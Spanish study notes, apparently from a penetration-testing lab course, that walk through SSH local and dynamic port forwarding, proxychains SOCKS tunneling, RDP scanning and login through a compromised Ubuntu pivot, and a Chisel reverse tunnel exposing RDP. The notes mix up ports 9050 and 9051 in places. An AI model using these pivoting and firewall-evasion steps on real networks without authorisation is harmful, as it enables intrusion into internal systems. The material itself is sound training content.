> La redirección de puertos (port forwarding) es una técnica que nos permite redirigir una solicitud de comunicación de un puerto a otro. Esta técnica utiliza TCP como la capa principal de comunicación para proporcionar una interacción en tiempo real para el puerto redirigido. Sin embargo, se pueden utilizar diferentes protocolos de la capa de aplicación, como SSH, o incluso SOCKS (que no pertenece a la capa de aplicación), para encapsular el tráfico redirigido. Esta técnica puede ser eficaz para evadir cortafuegos (firewalls) y aprovechar servicios existentes en el host comprometido para pivotar hacia otras redes.

### SSH Local Port Forwarding

![[ssh_port_forwarding.png| center | 700]]

> *Esto es solo un ejemplo ilustrativo para comprender el concepto*

Tenemos nuestro host de atacante (10.10.15.X) y un servidor Ubuntu objetivo (10.129.X.X) que hemos comprometido. Escanearemos el objetivo usando [[Nmap]] para buscar puertos abiertos.

```shell-session
amr251@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

El output nos muestra que el puerto 22 (SSH) está abierto. Para acceder al servicio MySQL, podemos o bien conectarnos por SSH y desde ahí entrar a MySQL desde el propio servidor Ubuntu, o hacer port forwarding al puerto 1234 y acceder de forma local. Un beneficio de acceder de forma local es que si queremos ejecutar un exploit remoto en el servicio MySQL, no podremos hacerlo sin port forwarding. Esto es debido a que MySQL está alojado de forma local en el puerto `3306`.

##### Habilitar el Port Forward local

```shell-session
amr251@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
```

El comando `-L` indica al cliente SSH que solicite al servidor SSH redirigir (reenviar) todos los datos que enviamos a través del puerto 1234 hacia `localhost:3306` en el servidor Ubuntu. Al hacer esto, deberíamos poder acceder al servicio MySQL localmente a través del puerto 1234. Podemos utilizar herramientas como `netstat` o `nmap` para consultar nuestro `localhost` en el puerto 1234 y verificar si el servicio MySQL ha sido correctamente redirigido.

##### Confirmando el Port Forward con Netstat

```shell-session
amr251@htb[/htb]$ netstat -antp | grep 1234

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh   
```

##### Confirmando el Port Forward con nmap

```shell-session
amr251@htb[/htb]$ nmap -v -sV -p1234 localhost

...SNIP...

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3
```

De forma similar, si queremos redirigir múltiples puertos desde el servidor Ubuntu hacia tu máquina local, podemos hacerlo incluyendo varios argumentos en el formato `puerto_local:servidor:puerto` en el comando `ssh`. Por ejemplo, el siguiente comando redirige el puerto 80 del servidor web Apache al puerto 8080 de tu máquina de ataque (localhost).

##### Forwarding múltiples puertos

```shell-session
amr251@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

### Estableciendo un Pivot

Ahora, si escribimos `ifconfig` en el host Ubuntu, veremos que este servidor tiene múltiples NICs:
- Una conectada a nuestro host de ataque (`ens192`)
- Una comunicando a otros hosts con red diferente (`ens224`)
- La interfaz loopback (`lo`)

```shell-session
ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

A diferencia del escenario anterior, donde sabíamos a qué puerto acceder, en el escenario actual no conocemos qué servicios hay al otro lado de la red. Por tanto, podemos escanear rangos pequeños de direcciones IP en la red (por ejemplo, 172.16.5.1-200) o toda la subred (172.16.5.0/23). No podemos realizar este escaneo directamente desde nuestra máquina de ataque porque no tiene rutas hacia la red 172.16.5.0/23. Para ello, necesitaremos realizar un reenvío dinámico de puertos y pivotar el tráfico de red a través del servidor Ubuntu.

Podemos hacer esto iniciando un listener SOCKS en nuestra máquina local (ya sea la máquina de ataque personal o Pwnbox) y luego configurar SSH para reenviar ese tráfico, a través de la conexión SSH, hacia la red 172.16.5.0/23 tras conectarnos al host objetivo.

Esto se denomina **túnel SSH sobre proxy SOCKS**. SOCKS (Socket Secure) es un protocolo que permite la comunicación con servidores en entornos donde existen restricciones impuestas por cortafuegos. A diferencia de la mayoría de los casos en los que se inicia una conexión directa hacia un servicio, en el caso de SOCKS, el tráfico inicial lo genera un cliente SOCKS, que se conecta a un servidor SOCKS controlado por el usuario que desea acceder a un servicio del lado del cliente. Una vez establecida la conexión, el tráfico de red puede ser encaminado a través del servidor SOCKS en nombre del cliente conectado.

Esta técnica se utiliza frecuentemente para **evadir restricciones impuestas por cortafuegos**, permitiendo que una entidad externa las sobrepase y acceda a servicios internos dentro del entorno protegido. Otro beneficio de utilizar un proxy SOCKS para pivotar y reenviar datos es que puede crear una ruta hacia un servidor externo incluso desde redes con NAT. Actualmente existen dos tipos de proxies SOCKS: **SOCKS4 y SOCKS5**. SOCKS4 no proporciona autenticación ni soporte para UDP, mientras que SOCKS5 sí lo hace.

Veamos un ejemplo en el que tenemos una red enmascarada (NAT) 172.16.5.0/23, a la que no podemos acceder directamente.

![[ssh_port_forwarding2.png| 800]]

En la imagen anterior, el **host de ataque** inicia el cliente SSH y solicita al servidor SSH que le permita enviar datos TCP a través del socket SSH. El servidor SSH responde con un acuse de recibo (acknowledgment), y entonces el cliente SSH comienza a **escuchar en `localhost:9050`**. Cualquier dato que se envíe a este puerto local será retransmitido a toda la red **172.16.5.0/23** a través de la conexión SSH.

Podemos usar el siguiente comando para llevar a cabo este **reenvío dinámico de puertos (dynamic port forwarding)**:

```shell-session
ssh -D 9051 ubuntu@10.129.202.64
```

El argumento **`-D`** solicita al servidor SSH que habilite el reenvío dinámico de puertos. Una vez que lo tengamos habilitado, necesitaremos una herramienta que pueda enrutar los paquetes de cualquier herramienta a través del puerto **9050**. Podemos hacerlo utilizando la herramienta **`proxychains`**, que es capaz de redirigir conexiones TCP a través de servidores proxy TOR, SOCKS y HTTP/HTTPS, y también permite encadenar múltiples servidores proxy juntos.

Utilizando `proxychains`, también podemos ocultar la dirección IP del host que realiza la petición, ya que el host receptor solo verá la IP del host de pivote. `Proxychains` se utiliza a menudo para forzar que el tráfico TCP de una aplicación pase a través de proxies alojados como SOCKS4/SOCKS5, TOR o proxies HTTP/HTTPS.

Para informar a `proxychains` de que debe usar el **puerto 9050**, debemos modificar el archivo de configuración de proxychains ubicado en **`/etc/proxychains.conf`**. Podemos añadir la línea siguiente al final si no está ya presente: `socks4 127.0.0.1 9051`

##### Revisando `/etc/proxychains4.conf`

```shell-session
amr251@htb[/htb]$ tail -4 /etc/proxychains4.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9051
```

Ahora, cuando iniciemos nmap con proxychains usando el comando inferior, enrutará todos los paquetes de nmap al puerto local 9050, donde nuestro cliente SSH está en escucha, lo que hará forwarding de todos los paquetes sobre SSH a la red 172.16.5.0/23

##### Usando nmap con Proxychains

```shell-session
amr251@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200

ProxyChains-3.1 (http://proxychains.sf.net)
```

Esta parte, en la que empaquetamos todos los datos de Nmap utilizando **proxychains** y los reenviamos a un servidor remoto, se llama **túnel SOCKS** (**SOCKS tunneling**). Otro punto importante a recordar aquí es que **solo podemos realizar un escaneo completo de conexión TCP** (**full TCP connect scan**) a través de proxychains. La razón de esto es que proxychains no puede interpretar paquetes parciales. Si se envían paquetes parciales, como los escaneos de media conexión (**half-connect scans**), se obtendrán resultados incorrectos.

También debemos tener en cuenta que las comprobaciones de hosts activos (**host-alive checks**) pueden no funcionar contra objetivos Windows, porque el cortafuegos de Windows Defender **bloquea las solicitudes ICMP** (los pings tradicionales) por defecto.

Un escaneo completo de conexión TCP sin ping sobre todo un rango de red puede tardar mucho tiempo. Por tanto, en este módulo nos centraremos principalmente en **escanear hosts individuales** o **pequeños rangos de hosts que sepamos que están activos**, que en este caso será un host Windows en **172.16.5.19**. Realizaremos un escaneo remoto de sistema usando el comando inferior

##### Enumerando el Windows objetivo a través de proxychains

```shell-session
amr251@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19
...SNIP...
```

El escaneo nmap revela múltiples puertos abiertos, uno de los cuáles de RDP (3389). De forma similar al escaneo nmap, podemos pivotar `msfconsole` vía proxychains para realizar escaneos a RDP vulnerables usando módulos auxiliares de Metasploit.

```shell-session
amr251@htb[/htb]$ proxychains msfconsole -q

msf6 > search rdp_scanner
msf6 > use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
rhosts => 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run

[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)
[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Al final de la salida anterior, podemos ver que el **puerto RDP está abierto** junto con la **versión del sistema operativo Windows**.

Dependiendo del nivel de acceso que tengamos a este host durante una auditoría, podríamos intentar ejecutar un exploit o iniciar sesión utilizando credenciales obtenidas. En este módulo, **iniciaremos sesión en el host remoto Windows a través del túnel SOCKS**. Esto se puede hacer usando **xfreerdp**. El usuario en nuestro caso es `victor`, y la contraseña es `pass@123`.

##### Usando xfreerdp con Proxychains

```shell-session
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

### Hacer Port Forwarding con Chisel

Chisel es una herramienta que permite establecer túneles TCP (port forwarding) a través de una conexión HTTP/HTTPS, útil en escenarios de pivoting y redes segmentadas. Primero, descargamos chisel para posteriormente subirlo a la máquina víctima.

```
wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
gunzip chisel_1.8.1_linux_amd64.gz
mv chisel_1.8.1_linux_amd64 chisel
chmod +x chisel
```

Subimos la herramienta mediante `scp` o de cualquier otra forma conveniente. En este punto, configuramos el servidor en la máquina que actuará como listener, en este caso, la nuestra:

```bash
./chisel server --port 8000 --reverse
```

- `--port 8000`: puerto donde escucha el servidor Chisel.
- `--reverse`: permite conexiones reversas desde los clientes.

El siguiente punto es en la máquina víctima (*host comprometido*) establecer el cliente (*Port Forwarding hacia una máquina interna*):

```bash
chisel client <IP_del_Servidor>:8000 R:9999:127.0.0.1:3389
```

- `client <IP>:8000`: conecta al servidor Chisel en el puerto 8000.
- `R:9999:127.0.0.1:3389`: establece un túnel reverso que expone el puerto 3389 (RDP local del cliente) como si estuviera disponible en el puerto 9999 del servidor.

🔁 Esto permite conectarte desde tu equipo al puerto 9999 del servidor Chisel, y terminaremos accediendo al servicio RDP (puerto 3389) de la máquina comprometida.



